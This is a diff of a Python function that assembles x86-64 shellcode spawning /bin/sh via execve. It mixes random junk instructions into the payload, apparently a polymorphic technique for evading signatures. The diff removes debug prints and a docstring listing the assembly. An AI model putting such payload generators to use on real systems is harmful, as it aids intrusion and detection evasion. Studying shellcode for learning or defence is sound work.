@@ -25,36 +25,12 @@ def partie6():
         case 1 :
             resultat_concat = xorrsi + pushrsi + movrdi + pushrdi + pushrsp + poprdi + moval + cdq + syscall
         case 2 : 
-            print("1")
             resultat_concat = xorrsi + pushrsi + full_random() + movrdi + pushrdi + pushrsp + poprdi + moval + cdq + syscall
         case 3 :
-            print("2")
             resultat_concat = xorrsi + pushrsi + full_random() + movrdi + pushrdi + full_random() + pushrsp + poprdi + moval + cdq + syscall
         case 4 :
-            print("3")
             resultat_concat = xorrsi + pushrsi + full_random() + movrdi + pushrdi + full_random() + pushrsp + poprdi + moval + full_random() +cdq + syscall
         case 5 :
-            print("4")
             resultat_concat = xorrsi + full_random() + pushrsi + full_random() + movrdi + full_random() + pushrdi + full_random() + pushrsp + poprdi + moval + cdq + syscall
-
-    print("Part 6 = ", resultat_concat)
-
-
-    """
-    ; part 6
-	xor rsi, rsi
-	push rsi
-	mov rdi, 0x68732f2f6e69622f
-	push rdi
-	push rsp
-	pop rdi
-	mov al, 59
-	cdq
-	syscall
-    
-    """
-
-    #print("Partie 6 : ",part6)
-    #print(" ")
 
     return resultat_concat
